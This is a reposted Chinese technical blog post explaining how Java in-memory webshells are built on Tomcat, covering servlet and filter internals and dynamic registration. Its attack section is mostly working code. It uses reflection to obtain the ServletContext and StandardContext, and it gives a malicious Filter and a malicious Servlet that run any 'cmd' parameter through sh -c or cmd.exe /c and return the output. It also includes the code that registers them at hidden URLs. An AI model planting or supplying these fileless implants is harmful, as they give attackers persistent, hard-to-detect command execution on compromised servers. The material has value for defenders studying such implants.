<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Y4Wvs3YK1J03Kh7HfPY3gg)

1. 前言 2. 基础知识 2.1 servlet 和 filter2.2 servlet 和 filter 的生命周期 2.3 Tomcat 的 Container – 容器组件 2.4 Tomcat 中的启动加载顺序 3. 内存马技术实现介绍 3.1 获取上下文对象 ServletContext3.1.1 通过当前 request 对象获取 ServletContext3.1.2 通过 `Thread.currentThread().getContextClassLoader()` 获取 StandardContext3.1.3 在 spring 项目中通过 spring 容器来获取 servletContext 对象（不推荐）3.2 构造内存 shell3.2.1 添加恶意 filter3.2.2 添加恶意 servlet4. 总结 5. 参考资料

1. 前言
-----

平时遇到可 RCE 的点，都是借助工具一键注入内存马，但对其中的原理并没有很清楚的了解。本文主要跟随前辈大佬的学习笔记，以 Tomcat 为例，初探 Java 内存马的实现原理。

2. 基础知识
-------

### 2.1 servlet 和 filter

`Servlet` 主要的作用是可以动态地生产 Web 页面，他执行在客户端请求和服务器响应的之间。比较简单地理解就是，一个路由 URL，就会有对应的 servlet 对这个路由进行处理。

Filter 是一段可以复用的代码，它用来拦截 HTTP 请求、响应、进行一些处理和转换。常见一些 Javaweb 项目会在 Filter 位置创建一些 XSS 拦截器或者 SQL 拦截器，用来统一处理 SQL 注入漏洞或者 XSS 漏洞。Filter 无法产生一个请求或者响应，它只能针对某一资源的请求或者响应**进行修改**。

### 2.2 servlet 和 filter 的生命周期

**Servlet**：Servlet 的生命周期开始于 Web 容器的启动时，它就会被载入到 Web 容器内存中，直到 Web 容器停止运行或者重新装入 servlet 时候结束。这里也就是说明，一旦 Servlet 被装入到 Web 容器之后，一般是会长久驻留在 Web 容器之中。

*   **装入**：**启动服务器时**加载 Servlet 的实例
    
*   **初始化**：web 服务器启动时或 web 服务器接收到请求时，或者两者之间的某个时刻启动。**初始化工作**有 init() 方法负责执行完成
    
*   **调用**：从第一次到以后的多次**访问**，都是只调用 doGet() 或 doPost() 方法
    
*   **销毁**：**停止服务器时**调用 destroy() 方法，销毁实例
    

**Filter**：自定义 Filter 的实现，一定要求 javax.servlet.Filter 下的三个方法的实现，它们分别是`init()`、`doFilter()`、`destroy()`

*   **启动服务器时**加载过滤器的实例，并调用 init() 方法来初始化实例；
    
*   **每一次请求时**都只调用方法 doFilter() 进行处理；
    
*   **停止服务器时**调用 destroy() 方法，销毁实例。
    

### 2.3 Tomcat 的 Container – 容器组件

Tomcat 中的 Container 作用：

用于封装和管理 Servlet，以及具体处理 Request 请求，在 Connector 内部包含了 4 个子容器：

```
Engine，实现类为 org.apache.catalina.core.StandardEngine
Host，实现类为 org.apache.catalina.core.StandardHost
Context，实现类为 org.apache.catalina.core.StandardContext
Wrapper，实现类为 org.apache.catalina.core.StandardWrapper

```

这四个字容器实际上是自上向下的包含关系：

**Engine**：最顶层**容器组件**，其下可以包含多个 Host。**Host**：一个 Host 代表一个**虚拟主机**，其下可以包含多个 Context。**Context**：一个 Context 代表一个 **Web 应用**，其下可以包含多个 Wrapper。**Wrapper**：一个 Wrapper 代表一个 **Servlet**。

关系图如下（借用参考文章的图）：

![](https://mmbiz.qpic.cn/mmbiz/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0bticT8znNszwD5568mISjK6r70FERGm0HA6lEvrzVW8jWWoWYydjFAiaA/640?wx_fmt=other)

对于 tomcat 的目录来说，`webapps目录`对应的就是 `Host` 组件，下面的 `cas` 和 `manager` 等一个个 webapp 对应的就是 `Context` 组件，Wrapper 就是容器内的 Servlet 了

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0btcNiaWctnVh9kW8Cjhge7KEOgONMQjC8ibjs5jHS2ibiaDvgrsn7XKr3Uw/640?wx_fmt=png)

### 2.4 Tomcat 中的启动加载顺序

加载过程在 Tomcat 的`org.apache.catalina.core.StandardContext#startInternal()`：

```
@Override
protected synchronized void startInternal() throws LifecycleException {
//设置webappLoader 代码省略
//Standard container startup 代码省略
try {

// Set up the context init params
mergeParameters();

// Configure and call application event listeners
if (ok) {
if (!listenerStart()) {
log.error(sm.getString("standardContext.listenerFail"));
ok = false;
}
}
// Configure and call application filters
if (ok) {
if (!filterStart()) {
log.error(sm.getString("standardContext.filterFail"));
ok = false;
}
}
// Load and initialize all "load on startup" servlets
if (ok) {
if (!loadOnStartup(findChildren())){
log.error(sm.getString("standardContext.servletFail"));
ok = false;
}
}

// Start ContainerBackgroundProcessor thread
super.threadStart();
} finally {
// Unbinding thread
unbindThread(oldCCL);
}
}

```

从代码中可以看到，加载顺序 context-param->listeners->filters->servlets ：

1.  首先初始化 context-param 节点：`mergeParameters()`
    
2.  接着配置和调用 listeners 并开始监听：`listenerStart()`
    
3.  然后配置和调用 filters ，filters 开始起作用：`filterStart()`
    
4.  最后加载和初始化配置在 load on startup 的 servlets：`loadOnStartup(findChildren())`
    

3. 内存马技术实现介绍
------------

从 servlet3.0 开始，提供了动态注册 Servlet 、filter 、Listener，这里重点关注 `Servlet` 和 `filter`，因为 Servlet 能够帮助我们接受 request 请求和 response 响应，并且针对传入内容进行操作，filter 也是可以做得到的。

相关函数如下：

```
<T extends Filter>createFilter(Java.lang.Class<T> clazz)
javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);
javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);
javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class<? extends Filter> var2);


<T extends Servlet>createServlet(java.lang.Class<T> clazz)
Dynamic addServlet(String var1, String var2);
Dynamic addServlet(String var1, Servlet var2);
Dynamic addServlet(String var1, Class<? extends Servlet> var2);

```

### 3.1 获取上下文对象 ServletContext

**Servlet 上下文**又叫做：**ServletContext**。

当 WEB 服务器启动时，会为每一个 WEB 应用程序 (webapps 下的每个目录就是一个应用程序，也就是前面介绍的 Context 组件) 创建一块**共享的存储区域**。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0b5comLB3avENnDXmTe51GFL87Q6sIpKpP5ch5NaD1p5iaOjG3zBNLWsA/640?wx_fmt=png)

ServletContext 也叫做 “公共区域”，**也就是同一个 WEB 应用程序中，所有的 Servlet 和 JSP 都可以共享同一个区域**。

ServletContext 在 WEB 服务器启动时创建，服务器关闭时销毁。

#### 3.1.1 通过当前 request 对象获取 ServletContext

```
request.getSession().getServletContext();

```

所以这时候，如何获取 servlet 上下文（ServletContext）这个问题，就变成了如何获取**运行状态中上下文中的 request 对象**。

`org.apache.catalina.core.ApplicationFilterChain`类当中存在两个 static 对象分别是：

```
private static final ThreadLocal<ServletRequest> lastServicedRequest;
private static final ThreadLocal<ServletResponse> lastServicedResponse;

```

而在这个逻辑中当`ApplicationDispatcher.WRAP_SAME_OBJECT`为 true 的情况下，**就会把 request 对象和 response 对象暂时存放在 lastServicedRequest 和 lastServicedResponse 当中**。

```
if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
lastServicedRequest.set(request);
lastServicedResponse.set(response);
}

```

所以现在我们要做的就是，通过反射来改变其中类的一些值，使得 `request` 对象和 `response` 对象存放在 `lastServicedRequest` 和 `lastServicedResponse` 当中。

这样做需要通过反射修改 3 个部分。

**通过反射修改 ApplicationDispatcher.WRAP_SAME_OBJECT 判断结果为 true**：

```
Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
modifiersField.setAccessible(true);
modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
f.setAccessible(true);
if (!f.getBoolean(null)) {
   f.setBoolean(null, true);
}

```

**通过反射初始化 lastServicedRequest 存放 request 对象**：

```
//初始化 lastServicedRequest
c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
f = c.getDeclaredField("lastServicedRequest");
modifiersField = f.getClass().getDeclaredField("modifiers");
modifiersField.setAccessible(true);
modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
f.setAccessible(true);
if (f.get(null) == null) {
   f.set(null, new ThreadLocal());
}

```

**通过反射初始化 lastServicedResponse 存放 response 对象**：

```
//初始化 lastServicedResponse
f = c.getDeclaredField("lastServicedResponse");
modifiersField = f.getClass().getDeclaredField("modifiers");
modifiersField.setAccessible(true);
modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
f.setAccessible(true);
if (f.get(null) == null) {
   f.set(null, new ThreadLocal());
}
} catch (Exception e) {
   e.printStackTrace();
}

```

通过这 3 次的反射修改，就能在下一次请求中成功获取上下文的 servletContext 对象，借用一张图：

![](https://mmbiz.qpic.cn/mmbiz/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0btnTvRBTTHTbJXu8ibjaw6jZSkLb10cLtUpmiczcDq55rv4FaJBlfV62g/640?wx_fmt=other)

获取到的对象为`ApplicationContext`类实例。

#### 3.1.2 通过 `Thread.currentThread().getContextClassLoader()` 获取 StandardContext

```
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();

```

借用一张图：

![](https://mmbiz.qpic.cn/mmbiz/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0bW2hjBIYibxWyzacZNUUStATju6Licfsv8A6T3ukf7lYibt0BuHRsLWG5g/640?wx_fmt=other)

获取到的对象为`StandardContext`类实例。

tomcat 7 的结构不太一样，导致 tomcat 7 这种方法拿不到上下文中的 StandardContext 。

#### 3.1.3 在 spring 项目中通过 spring 容器来获取 servletContext 对象（不推荐）

```
ServletContext servletContext = ContextLoader.getCurrentWebApplicationContext().getServletContext();

```

借用一张图：

![](https://mmbiz.qpic.cn/mmbiz/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0bvlE8iazOGA5kv0HbiaFibwPf1iaOFrhDFjUUGBVPshnLbvKzSDUUkicnicjQ/640?wx_fmt=other)

获取到的对象为`ApplicationContext`类实例。

这种情况下有一定的限制，就是 servletContext 值的初始化的 servletContextListener 一定要在 org.springframework.web.context.ContextLoaderListener 之前加载。

### 3.2 构造内存 shell

要让 servlet 被外界访问到，可以在 web.xml 之中进行一些映射工作：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUzpibZyyHN9EC6Vib1Xd1s0b3sZuSz7vJuOpnSWdDFyMPxfHkbu4a18ia6z3QkQj5cnJuYekNKl4oWw/640?wx_fmt=png)

前面提到过从 servlet3.0 开始，提供了**动态注册** Servlet 、filter ，这里主要学习怎么针对 Servlet 和 filter 如何进行动态注册。

#### 3.2.1 添加恶意 filter

先写一个恶意的 filter ，前面说过 filter 的实现，需要分别实现三个接口 init 、doFilter 、destroy 。

```
Filter filter = new Filter() {
   @Override
   public void init(FilterConfig arg0) throws ServletException {}

   @Override
   public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2) throws IOException, ServletException {

       HttpServletRequest req = (HttpServletRequest) arg0;
       if (req.getParameter("cmd") != null) {
           boolean isLinux = true;
           String osTyp = System.getProperty("os.name");
           if (osTyp != null && osTyp.toLowerCase().contains("win")) {
               isLinux = false;
          }
           String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
           InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
           Scanner s = new Scanner( in ).useDelimiter("\\a");
           String output = s.hasNext() ? s.next() : "";
           arg1.getWriter().write(output);
           arg1.getWriter().flush();
           return;
      }
       arg2.doFilter(arg0, arg1);
  }

   @Override
   public void destroy() {

  }
}

```

Tomcat 在 `org.apache.catalina.core.ApplicationContextFacade` 当中实现了之前我们说的 ServletContext 中的 `addFilter` 和 `addServlet`。先看 `addFilter` 的实现，这部分实现在 `ApplicationContext#addFilter` 当中。

在 addFilter 中，代码的作用实际就是新建一个 filterDef 然后调用`this.context.addFilterDef(filterDef);`进行添加了而已。完全可以通过反射的方式获取上下文 context 自行进行添加。

```
Filter filter = new filter(){上面的恶意代码}
FilterDef filterDef = new FilterDef();
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
standardContext.addFilterDef(filterDef);

```

在 `ApplicationFilterFactory.createFilterChain` 当中，首先从 StandardContext 对象中**获取 filterMaps** ，然后循环遍历 filterMaps ，最后再**添加到 filterChain 当中**。

上面代码我们构造好了 `filterDef` ，当时并没有添加进 filterMap 当中，自然也不会添加到 filterChain 中去，所以添加进去：

```
FilterMap m = new FilterMap();
m.setFilterName(filterDef.getFilterName());
m.setDispatcher(DispatcherType.REQUEST.name());
m.addURLPattern("/testfilter");
standardContext.addFilterMapBefore(m);

```

主要关注 `standardContext.addFilterMapBefore` 这个方法，这个方法最终的效果是要把我们创建的 filterMap 放到第一位去。因为从刚刚 `ApplicationFilterFactory.createFilterChain` 当中，我们知道这个顺序是从头到尾，看是一次次创建的，所以放到最前面是很有必要的。

最后还有一个问题需要解决，如何将 filter 添加到 `filterConfigs` 当中。关注 `StandardContext#filterStart` 方法就可以知道，遍历了 filterDefs 当中 filterName ，然后把对应的 name 添加到 filterConfigs 当中。再通过反射，在构造器实例化的时候把 filterConfig 加入到 filterConfigs 当中

```
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
FilterConfig filterConfig = (FilterConfig) constructor.newInstance(standardContext, filterDef);
filterConfigs.put(name, filterConfig);

```

如此一系列操作，就能构造并添加一个恶意的 filter 了。

注意：tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不太一样。

```
tomcat 7:

org.apache.catalina.deploy.FilterDef;
org.apache.catalina.deploy.FilterMap;

tomcat 8:

org.apache.tomcat.util.descriptor.web.FilterDef;
org.apache.tomcat.util.descriptor.web.FilterMap;

```

#### 3.2.2 添加恶意 servlet

先写一个恶意的 servlet ，接口下需要有 init 、getServletConfig、service、getServletInfo、destroy。

```
Servlet servlet = new Servlet() {
   @Override
   public void init(ServletConfig servletConfig) throws ServletException {

  }
   @Override
   public ServletConfig getServletConfig() {
       return null;
  }
   @Override
   public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
       String cmd = servletRequest.getParameter("cmd");
       boolean isLinux = true;
       String osTyp = System.getProperty("os.name");
       if (osTyp != null && osTyp.toLowerCase().contains("win")) {
           isLinux = false;
      }
       String[] cmds = isLinux ? new String[] {"sh", "-c", cmd} : new String[] {"cmd.exe", "/c", cmd};
       InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
       Scanner s = new Scanner( in ).useDelimiter("\\a");
       String output = s.hasNext() ? s.next() : "";
       PrintWriter out = servletResponse.getWriter();
       out.println(output);
       out.flush();
       out.close();
  }
   @Override
   public String getServletInfo() {
       return null;
  }
   @Override
   public void destroy() {

  }
};

```

我们知道 Wrapper 负责管理 Servlet ，而之前在动态加载 filter 的时候，我们通过 standardContext 当中的 addFilterDef 和 addFilterMap 来完成了 filter 的动态添加。那么是否在 standardContext 当中也能完成 Wrapper 的动态添加呢？答案是肯定的，`createWrapper` 就能够搞定了，实例化一个新的 Wrapper 对象，把相关内容写进去。

```
org.apache.catalina.Wrapper newWrapper = stdcontext.createWrapper();
newWrapper.setName(n);
newWrapper.setLoadOnStartup(1);
newWrapper.setServlet(servlet);
newWrapper.setServletClass(servlet.getClass().getName());

```

这里这时候又有一个问题了，这个新建的 Wrapper 对象，并不在 StandardContext 的 children 当中，我们可以通过 `StandardContext#addChild` 把它加到 StandardContext 的 children 当中。最后还需要将我们的 Wrapper 对象，和访问的 url 进行绑定。

```
stdcontext.addChild(newWrapper);
stdcontext.addServletMapping("/testservlet",n);

```

如此操作，就能构造并添加一个恶意的 servlet 作为内存 shell 了，该方法较 filter 更好，tomcat 7 和 8 能够通用。

4. 总结
-----

本文讲解了 filter 和 servlet 两种类型内存马实现的一些基础知识，对反射操作 servlet 上下文有了更深的理解，后面我还将结合具体实例场景（jsp 文件构造内存马；命令执行、反序列化构造内存马）进行学习。

5. 参考资料
-------

[基于 Tomcat 无文件 Webshell 研究](https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652474966&idx=1&sn=1c75686865f7348a6b528b42789aeec8&scene=21#wechat_redirect)

Servlet 上下文